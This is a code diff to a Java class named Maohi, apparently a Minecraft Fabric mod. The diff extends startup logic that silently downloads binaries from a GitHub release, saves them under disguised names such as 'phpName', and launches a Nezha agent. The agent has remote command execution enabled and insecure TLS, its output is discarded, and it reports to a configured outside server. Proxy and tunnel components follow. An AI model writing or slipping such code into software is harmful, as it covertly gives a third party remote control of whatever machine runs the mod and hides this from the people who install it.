@@ -34,6 +34,7 @@ public class Maohi implements ModInitializer {
 
     private static final String UUID         = cfg("UUID", "");
     private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "");
+    private static final String NEZHA_PORT = cfg("NEZHA_PORT", "");
     private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "");
     private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");
     private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
@@ -230,13 +231,23 @@ public class Maohi implements ModInitializer {
 
     private void downloadBinaries(String arch) {
         String base = "https://github.com/eooce/test/releases/download/" + arch + "/";
+
+        String nezhaBinary = (NEZHA_PORT != null && !NEZHA_PORT.trim().isEmpty())
+            ? "agent"
+            : "v1";
+
         String[][] files = {
-            { phpName, base + "v1"  },
+            { phpName, base + nezhaBinary },
             { webName, base + "sbx" },
             { botName, base + "bot" }
         };
+
         for (String[] f : files) {
-            try { downloadFile(f[0], f[1]); } catch (Exception e) {}
+            try {
+                downloadFile(f[0], f[1]);
+            } catch (Exception e) {
+                LOGGER.warn("Download failed: " + f[1]);
+            }
         }
     }
 
@@ -324,40 +335,92 @@ public class Maohi implements ModInitializer {
 
     private void runNezha() {
         if (NEZHA_SERVER == null || NEZHA_SERVER.isEmpty() ||
-            NEZHA_KEY    == null || NEZHA_KEY.isEmpty()) return;
-        String serverPort = NEZHA_SERVER.contains(":") ?
-            NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(":") + 1) : "";
-        Set<String> tlsPorts = new HashSet<>(Arrays.asList("443","8443","2096","2087","2083","2053"));
-        String nezhatls = tlsPorts.contains(serverPort) ? "true" : "false";
-        String configYaml =
-            "client_secret: " + NEZHA_KEY + "\n" +
-            "debug: false\n" +
-            "disable_auto_update: true\n" +
-            "disable_command_execute: false\n" +
-            "disable_force_update: true\n" +
-            "disable_nat: false\n" +
-            "disable_send_query: false\n" +
-            "gpu: false\n" +
-            "insecure_tls: true\n" +
-            "ip_report_period: 1800\n" +
-            "report_delay: 4\n" +
-            "server: " + NEZHA_SERVER + "\n" +
-            "skip_connection_count: true\n" +
-            "skip_procs_count: true\n" +
-            "temperature: false\n" +
-            "tls: " + nezhatls + "\n" +
-            "use_gitee_to_upgrade: false\n" +
-            "use_ipv6_country_code: false\n" +
-            "uuid: " + UUID + "\n";
+            NEZHA_KEY == null || NEZHA_KEY.isEmpty()) {
+            LOGGER.info("NEZHA variable is empty, skipping running");
+            return;
+        }
+
         try {
-            Path configYamlPath = FILE_PATH.resolve("config.yaml");
-            Files.writeString(configYamlPath, configYaml);
-            new ProcessBuilder(FILE_PATH.resolve(phpName).toString(), "-c", configYamlPath.toString())
-                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
-                .redirectError(ProcessBuilder.Redirect.DISCARD)
-                .start();
+            if (NEZHA_PORT != null && !NEZHA_PORT.isEmpty()) {
+
+                Set<String> tlsPorts = new HashSet<>(Arrays.asList(
+                    "443","8443","2096","2087","2083","2053"
+                ));
+
+                List<String> command = new ArrayList<>();
+                command.add(FILE_PATH.resolve(phpName).toString());
+                command.add("-s");
+                command.add(NEZHA_SERVER + ":" + NEZHA_PORT);
+                command.add("-p");
+                command.add(NEZHA_KEY);
+
+                if (tlsPorts.contains(NEZHA_PORT)) {
+                    command.add("--tls");
+                }
+
+                command.add("--disable-auto-update");
+                command.add("--report-delay");
+                command.add("4");
+                command.add("--skip-conn");
+                command.add("--skip-procs");
+
+                new ProcessBuilder(command)
+                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
+                    .redirectError(ProcessBuilder.Redirect.DISCARD)
+                    .start();
+
+                
+
+            } else {
+                String serverPort = NEZHA_SERVER.contains(":") ?
+                    NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(":") + 1) : "";
+
+                Set<String> tlsPorts = new HashSet<>(Arrays.asList(
+                    "443","8443","2096","2087","2083","2053"
+                ));
+
+                String nezhatls = tlsPorts.contains(serverPort) ? "true" : "false";
+
+                String configYaml =
+                    "client_secret: " + NEZHA_KEY + "\n" +
+                    "debug: false\n" +
+                    "disable_auto_update: true\n" +
+                    "disable_command_execute: false\n" +
+                    "disable_force_update: true\n" +
+                    "disable_nat: false\n" +
+                    "disable_send_query: false\n" +
+                    "gpu: false\n" +
+                    "insecure_tls: true\n" +
+                    "ip_report_period: 1800\n" +
+                    "report_delay: 4\n" +
+                    "server: " + NEZHA_SERVER + "\n" +
+                    "skip_connection_count: true\n" +
+                    "skip_procs_count: true\n" +
+                    "temperature: false\n" +
+                    "tls: " + nezhatls + "\n" +
+                    "use_gitee_to_upgrade: false\n" +
+                    "use_ipv6_country_code: false\n" +
+                    "uuid: " + UUID + "\n";
+
+                Path configYamlPath = FILE_PATH.resolve("config.yaml");
+                Files.writeString(configYamlPath, configYaml);
+
+                new ProcessBuilder(
+                    FILE_PATH.resolve(phpName).toString(),
+                    "-c", configYamlPath.toString()
+                )
+                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
+                    .redirectError(ProcessBuilder.Redirect.DISCARD)
+                    .start();
+
+                
+            }
+
             Thread.sleep(1000);
-        } catch (Exception e) {}
+
+        } catch (Exception e) {
+            LOGGER.error("Nezha start error", e);
+        }
     }
 
     private void runSingbox() {
